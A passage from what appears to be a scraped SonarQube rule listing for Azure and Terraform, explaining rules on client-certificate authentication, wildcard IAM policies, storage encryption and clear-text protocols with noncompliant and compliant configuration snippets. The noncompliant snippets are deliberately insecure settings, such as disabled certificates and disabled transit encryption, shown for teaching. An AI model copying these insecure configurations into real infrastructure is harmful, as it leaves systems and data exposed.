<pre data-diff-id="4" data-diff-type="compliant">
resource keyVault &#39;Microsoft.KeyVault/vaults&#64;2022-07-01&#39; &#61; {
  properties: {
    enableRbacAuthorization: true    // Compliant
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6382">
              azureresourcemanager:S6382
            </a>
          </td>
          <td>
            <details>
              <p>Disabling certificate-based authentication can reduce an organization’s ability to react against attacks on its critical functions and data.</p>
<p>Azure offers various authentication options to access resources: Anonymous connections, Basic authentication, password-based authentication, and
certificate-based authentication.</p>
<p>Choosing certificate-based authentication helps bring client/host trust by allowing the host to verify the client and vice versa. It cannot be
forged or forwarded by a man-in-the-middle eavesdropper, and the certificate’s private key is never sent over the network so it’s harder to steal than
a password.</p>
<p>In case of a security incident, certificates help bring investigators traceability and allow security operations teams to react faster. For
example, all compromised certificates could be revoked individually, or an issuing certificate could be revoked which causes all the certificates it
issued to become untrusted.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> This Azure resource is essential for the information system infrastructure. </li><li> This Azure resource is essential for mission-critical functions. </li><li> Compliance policies require access to this resource to be authenticated with certificates. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable certificate-based authentication.</p>
<h2>Sensitive Code Example</h2>
<p>Where the use of client certificates is controlled by a boolean value, such as:</p>
<ul><li> <code>Microsoft.Web/sites</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites?pivots&#61;deployment-language-arm-template#siteproperties" rel="nofollow">clientCertEnabled</a> </li><li> <code>Microsoft.SignalRService/signalR</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.signalrservice/signalr?pivots&#61;deployment-language-arm-template#signalrtlssettings" rel="nofollow">tls → clientCertEnabled</a> </li><li> <code>Microsoft.SignalRService/webPubSub</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.signalrservice/webpubsub?pivots&#61;deployment-language-arm-template#webpubsubtlssettings-1" rel="nofollow">tls → clientCertEnabled</a> </li><li> <code>Microsoft.ApiManagement/service/gateways/hostnameConfigurations</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/gateways/hostnameconfigurations?pivots&#61;deployment-language-arm-template#gatewayhostnameconfigurationcontractproperties" rel="nofollow">negotiateClientCertificate</a> </li></ul>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.SignalRService/webPubSub&#34;,
      &#34;apiVersion&#34;: &#34;2020-07-01-preview&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;tls&#34;: {
          &#34;clientCertEnabled&#34;: false
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="noncompliant">
resource example &#39;Microsoft.SignalRService/webPubSub&#64;2020-07-01-preview&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    tls: {
      clientCertEnabled: false // Sensitive
    }
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2015-08-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;clientCertEnabled&#34;: false
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="noncompliant">
resource example &#39;Microsoft.Web/sites&#64;2015-08-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    clientCertEnabled: false // Sensitive
  }
}
</pre>
<p>Where the use of client certificates can be made optional, such as:</p>
<ul><li> <code>Microsoft.Web/sites</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites?pivots&#61;deployment-language-arm-template#siteproperties" rel="nofollow">clientCertMode</a> </li><li> <code>Microsoft.App/containerApps</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.app/containerapps?pivots&#61;deployment-language-arm-template#ingress" rel="nofollow">configuration →
  ingress → clientCertificateMode</a> </li></ul>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2015-08-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;clientCertEnabled&#34;: true,
        &#34;clientCertMode&#34;: &#34;Optional&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="noncompliant">
resource example &#39;Microsoft.Web/sites&#64;2015-08-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    clientCertEnabled: true
    clientCertMode: &#39;Optional&#39; // Sensitive
  }
}
</pre>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.App/containerApps&#34;,
      &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;ingress&#34;: {
          &#34;clientCertificateMode&#34;: &#34;accept&#34;
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="noncompliant">
resource example &#39;Microsoft.App/containerApps&#64;2022-03-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    ingress: {
      clientCertificateMode: &#39;accept&#39; // Sensitive
    }
  }
}
</pre>
<p>Where client certificates can be used to authenticate outbound requests, such as:</p>
<ul><li> <code>Microsoft.DataFactory/factories/linkedservices</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datafactory/factories/linkedservices?pivots&#61;deployment-language-arm-template#httplinkedservicetypeproperties" rel="nofollow">typeProperties → authenticationType</a> where the request type is <code>Web</code> or <code>HttpServer</code> </li><li> <code>Microsoft.DataFactory/factories/pipelines</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.datafactory/factories/pipelines?pivots&#61;deployment-language-arm-template#webactivityauthentication" rel="nofollow">activites → typeProperties → authentication → type</a> where the activity type is <code>WebActivity</code> or <code>WebHook</code> </li><li> <code>Microsoft.Scheduler/jobCollections/jobs</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.scheduler/jobcollections/jobs?pivots&#61;deployment-language-arm-template#httprequest-1" rel="nofollow">action → request → authentication → type</a> </li><li> <code>Microsoft.Scheduler/jobCollections/jobs</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.scheduler/jobcollections/jobs?pivots&#61;deployment-language-arm-template#joberroraction-1" rel="nofollow">action → errorAction → request → authentication → type</a> </li></ul>
<pre data-diff-id="5" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DataFactory/factories/linkedservices&#34;,
      &#34;apiVersion&#34;: &#34;2018-06-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;type&#34;: &#34;Web&#34;,
        &#34;typeProperties&#34;: {
          &#34;authenticationType&#34;: &#34;Basic&#34;
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="15" data-diff-type="noncompliant">
resource example &#39;Microsoft.DataFactory/factories/linkedservices&#64;2018-06-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    type: &#39;Web&#39;
    typeProperties: {
      authenticationType: &#39;Basic&#39; // Sensitive
    }
  }
}
</pre>
<p>Where a list of permitted client certificates must be provided, such as:</p>
<ul><li> <code>Microsoft.DocumentDB/cassandraClusters</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.documentdb/cassandraclusters?pivots&#61;deployment-language-arm-template#clusterresourceproperties-1" rel="nofollow">clientCertificates</a> </li><li> <code>Microsoft.Network/applicationGateways</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.network/applicationgateways?pivots&#61;deployment-language-arm-template#applicationgatewaypropertiesformat-1" rel="nofollow">trustedClientCertificates</a> </li><li> <code>Microsoft.ServiceFabric/clusters</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.servicefabric/clusters?pivots&#61;deployment-language-arm-template#clusterproperties-1" rel="nofollow">clientCertificateCommonNames</a> or <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.servicefabric/clusters?pivots&#61;deployment-language-arm-template#clusterproperties-1" rel="nofollow">clientCertificateThumbprints</a> </li></ul>
<pre data-diff-id="6" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DocumentDB/cassandraClusters&#34;,
      &#34;apiVersion&#34;: &#34;2021-10-15&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;clientCertificates&#34;: []
      }
    }
  ]
}
</pre>
<pre data-diff-id="16" data-diff-type="noncompliant">
resource example &#39;Microsoft.DocumentDB/cassandraClusters&#64;2021-10-15&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    clientCertificates: [] // Sensitive
  }
}
</pre>
<p>Where a resouce can use both certificate-based and password-based authentication, such as:</p>
<ul><li> <code>Microsoft.ContainerRegistry/registries/tokens</code> with <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.containerregistry/registries/tokens?pivots&#61;deployment-language-arm-template#tokencredentialsproperties-1" rel="nofollow">credentials → certficates</a> and <code>credentials</code> → <code>passwords</code> </li></ul>
<pre data-diff-id="7" data-diff-type="noncompliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ContainerRegistry/registries/tokens&#34;,
      &#34;apiVersion&#34;: &#34;2022-12-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;credentials&#34;: {
          &#34;passwords&#34;: [
            {
              &#34;name&#34;: &#34;password1&#34;
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="17" data-diff-type="noncompliant">
resource example &#39;Microsoft.ContainerRegistry/registries/tokens&#64;2022-12-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    credentials: {
      passwords: [ // Sensitive
        {
          name: &#39;password1&#39;
        }
      ]
    }
  }
}
</pre>
<h2>Compliant Solution</h2>
<p>Where the use of client certificates is controlled by a boolean value:</p>
<pre data-diff-id="1" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.SignalRService/webPubSub&#34;,
      &#34;apiVersion&#34;: &#34;2020-07-01-preview&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;tls&#34;: {
          &#34;clientCertEnabled&#34;: true
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="compliant">
resource example &#39;Microsoft.SignalRService/webPubSub&#64;2020-07-01-preview&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    tls: {
      clientCertEnabled: true // Compliant
    }
  }
}
</pre>
<pre data-diff-id="2" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2015-08-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;clientCertEnabled&#34;: true,
        &#34;clientCertMode&#34;: &#34;Required&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="12" data-diff-type="compliant">
resource example &#39;Microsoft.Web/sites&#64;2015-08-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    clientCertEnabled: true // Compliant
    clientCertMode: &#39;Required&#39;
  }
}
</pre>
<p>Where the use of client certificates can be made optional:</p>
<pre data-diff-id="3" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.Web/sites&#34;,
      &#34;apiVersion&#34;: &#34;2015-08-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;clientCertEnabled&#34;: true,
        &#34;clientCertMode&#34;: &#34;Required&#34;
      }
    }
  ]
}
</pre>
<pre data-diff-id="13" data-diff-type="compliant">
resource example &#39;Microsoft.Web/sites&#64;2015-08-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    clientCertEnabled: true
    clientCertMode: &#39;Required&#39; // Sensitive
  }
}
</pre>
<pre data-diff-id="4" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.App/containerApps&#34;,
      &#34;apiVersion&#34;: &#34;2022-03-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;ingress&#34;: {
          &#34;clientCertificateMode&#34;: &#34;require&#34;
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="14" data-diff-type="compliant">
resource example &#39;Microsoft.App/containerApps&#64;2022-03-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    ingress: {
      clientCertificateMode: &#39;require&#39; // Sensitive
    }
  }
}
</pre>
<p>Where client certificates can be used to authenticate outbound requests:</p>
<pre data-diff-id="5" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DataFactory/factories/linkedservices&#34;,
      &#34;apiVersion&#34;: &#34;2018-06-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;type&#34;: &#34;Web&#34;,
        &#34;typeProperties&#34;: {
          &#34;authenticationType&#34;: &#34;ClientCertificate&#34;
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="15" data-diff-type="compliant">
resource example &#39;Microsoft.DataFactory/factories/linkedservices&#64;2018-06-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    type: &#39;Web&#39;
    typeProperties: {
      authenticationType: &#39;ClientCertificate&#39; // Compliant
    }
  }
}
</pre>
<p>Where a list of permitted client certificates must be provided:</p>
<pre data-diff-id="6" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.DocumentDB/cassandraClusters&#34;,
      &#34;apiVersion&#34;: &#34;2021-10-15&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;clientCertificates&#34;: [
          {
            &#34;pem&#34;: &#34;[base64-encoded certificate]&#34;
          }
        ]
      }
    }
  ]
}
</pre>
<pre data-diff-id="16" data-diff-type="compliant">
resource example &#39;Microsoft.DocumentDB/cassandraClusters&#64;2021-10-15&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    clientCertificates: [ // Compliant
      {
        pem: &#39;[base64-encoded certificate]&#39;
      }
    ]
  }
}
</pre>
<p>Where a resouce can use both certificate-based and password-based authentication:</p>
<pre data-diff-id="7" data-diff-type="compliant">
{
  &#34;$schema&#34;: &#34;http://schema.management.azure.com/schemas/2015-01-01/deploymentTemplate.json#&#34;,
  &#34;contentVersion&#34;: &#34;1.0.0.0&#34;,
  &#34;resources&#34;: [
    {
      &#34;type&#34;: &#34;Microsoft.ContainerRegistry/registries/tokens&#34;,
      &#34;apiVersion&#34;: &#34;2022-12-01&#34;,
      &#34;name&#34;: &#34;example&#34;,
      &#34;properties&#34;: {
        &#34;credentials&#34;: {
          &#34;certificates&#34;: [
            {
              &#34;name&#34;: &#34;certificate1&#34;,
              &#34;encodedPemCertificate&#34;: &#34;[base64-encoded certificate]&#34;
            }
          ]
        }
      }
    }
  ]
}
</pre>
<pre data-diff-id="17" data-diff-type="compliant">
resource example &#39;Microsoft.ContainerRegistry/registries/tokens&#64;2022-12-01&#39; &#61; {
  name: &#39;example&#39;
  properties: {
    credentials: {
      certificates: [ // Compliant
        {
          name: &#39;certificate1&#39;
          encodedPemCertificate: &#39;[base64-encoded certificate]&#39;
        }
      ]
    }
  }
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://learn.microsoft.com/en-us/azure/templates/" rel="nofollow">Azure Resource Manager templates</a> </li><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Boken Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li><li> <a href="https://cwe.mitre.org/data/definitions/668" rel="nofollow">MITRE, CWE-668</a> - Exposure of Resource to Wrong Sphere </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6304">
              terraform:S6304
            </a>
          </td>
          <td>
            <details>
              <p>A policy that allows identities to access all resources in an AWS account may violate <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity has permission to access
all resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive
information will occur.</p>
<h2>Ask Yourself Whether</h2>
<p>The AWS account has more than one resource with different levels of sensitivity.</p>
<p>A risk exists if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is
to organize or <a href="https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/" rel="nofollow">tag</a>
resources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>
<h2>Sensitive Code Example</h2>
<p>Update permission is granted for all policies using the wildcard (*) in the <code>Resource</code> property:</p>
<pre>
resource &#34;aws_iam_policy&#34; &#34;noncompliantpolicy&#34; {
  name        &#61; &#34;noncompliantpolicy&#34;

  policy &#61; jsonencode({
    Version &#61; &#34;2012-10-17&#34;
    Statement &#61; [
      {
        Action &#61; [
          &#34;iam:CreatePolicyVersion&#34;
        ]
        Effect   &#61; &#34;Allow&#34;
        Resource &#61; [
          &#34;*&#34; # Sensitive
        ]
      }
    ]
  })
}
</pre>
<h2>Compliant Solution</h2>
<p>Restrict update permission to the appropriate subset of policies:</p>
<pre>
resource &#34;aws_iam_policy&#34; &#34;compliantpolicy&#34; {
  name        &#61; &#34;compliantpolicy&#34;

  policy &#61; jsonencode({
    Version &#61; &#34;2012-10-17&#34;
    Statement &#61; [
      {
        Action &#61; [
          &#34;iam:CreatePolicyVersion&#34;
        ]
        Effect   &#61; &#34;Allow&#34;
        Resource &#61; [
          &#34;arn:aws:iam::${data.aws_caller_identity.current.account_id}:policy/team1/*&#34;
        ]
      }
    ]
  })
}
</pre>
<h2>Exceptions</h2>
<ul><li> Should not be raised on key policies (when AWS KMS actions are used.) </li><li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S6388">
              terraform:S6388
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted cloud storages can lead to data exposure. In the case that adversaries gain physical access to the storage medium they are able
to access unencrypted information.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The service contains sensitive information that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to encrypt cloud storages that contain sensitive information.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store" rel="nofollow">azurerm_data_lake_store</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
resource &#34;azurerm_data_lake_store&#34; &#34;store&#34; {
  name             &#61; &#34;store&#34;
  encryption_state &#61; &#34;Disabled&#34;  # Sensitive
}
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://registry.terraform.io/providers/hashicorp/azurerm/latest/docs/resources/data_lake_store" rel="nofollow">azurerm_data_lake_store</a>:</p>
<pre data-diff-id="1" data-diff-type="compliant">
resource &#34;azurerm_data_lake_store&#34; &#34;store&#34; {
  name             &#61; &#34;store&#34;
  encryption_state &#61; &#34;Enabled&#34;
  encryption_type  &#61; &#34;ServiceManaged&#34;
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/efs/latest/ug/encryption.html" rel="nofollow">Data encryption in Amazon EFS</a> </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://learn.microsoft.com/en-us/azure/backup/backup-encryption" rel="nofollow">Encryption in Azure Backup</a> </li><li> <a href="https://learn.microsoft.com/en-us/azure/mysql/single-server/concepts-security" rel="nofollow">Security in Azure Database for MySQL</a> </li><li> <a href="https://learn.microsoft.com/en-us/azure/postgresql/single-server/concepts-security" rel="nofollow">Security in Azure Database for PostgreSQL</a>
  </li><li> <a href="https://learn.microsoft.com/en-us/azure/storage/common/infrastructure-encryption-enable?tabs&#61;portal" rel="nofollow">Infrastructure double encryption
  of data</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=terraform:S5332">
              terraform:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul><li> sensitive data exposure </li><li> traffic redirected to a malicious endpoint </li><li> malware-infected software update or installer </li><li> execution of client-side code </li><li> corruption of critical information </li></ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul><li> bypassing isolation mechanisms </li><li> compromising a component of the network </li><li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li></ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http" rel="nofollow">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169" rel="nofollow">CVE-2019-6169</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327" rel="nofollow">CVE-2019-12327</a> </li><li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065" rel="nofollow">CVE-2019-11065</a> </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li><li> Application data transits over an untrusted network. </li><li> Compliance rules require the service to encrypt data in transit. </li><li> Your application renders web pages with a relaxed mixed content policy. </li><li> OS-level protections against clear-text traffic are deactivated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul><li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li><li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li><li> Use <code>https</code> instead of <code>http</code>. </li><li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li></ul>  </li><li> Enable encryption of cloud components communications whenever it is possible. </li><li> Configure your application to block mixed content when rendering web pages. </li><li> If available, enforce OS-level deactivation of all clear-text traffic. </li></ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/kinesis/" rel="nofollow">AWS Kinesis</a> Data Streams server-side encryption:</p>
<pre>
resource &#34;aws_kinesis_stream&#34; &#34;sensitive_stream&#34; {
    encryption_type &#61; &#34;NONE&#34; # Sensitive
}
</pre>
<p>For <a href="https://aws.amazon.com/elasticache/" rel="nofollow">Amazon ElastiCache</a>:</p>
<pre>
resource &#34;aws_elasticache_replication_group&#34; &#34;example&#34; {
    replication_group_id &#61; &#34;example&#34;
    replication_group_description &#61; &#34;example&#34;
    transit_encryption_enabled &#61; false  # Sensitive
}
</pre>
<p>For <a href="https://aws.amazon.com/ecs/" rel="nofollow">Amazon ECS</a>:</p>
<pre>
resource &#34;aws_ecs_task_definition&#34; &#34;ecs_task&#34; {
  family &#61; &#34;service&#34;
  container_definitions &#61; file(&#34;task-definition.json&#34;)

  volume {
    name &#61; &#34;storage&#34;
    efs_volume_configuration {
      file_system_id &#61; aws_efs_file_system.fs.id
      transit_encryption &#61; &#34;DISABLED&#34;  # Sensitive
    }
  }
}
</pre>
<p>For <a href="https://docs.aws.amazon.com/opensearch-service/index.html" rel="nofollow">Amazon OpenSearch domains</a>:</p>
<pre>
resource &#34;aws_elasticsearch_domain&#34; &#34;example&#34; {
  domain_name &#61; &#34;example&#34;
  domain_endpoint_options {
    enforce_https &#61; false # Sensitive
  }
  node_to_node_encryption {
    enabled &#61; false # Sensitive
  }
}
</pre>
<p>For <a href="https://aws.amazon.com/msk/" rel="nofollow">Amazon MSK</a> communications between clients and brokers:</p>
<pre>
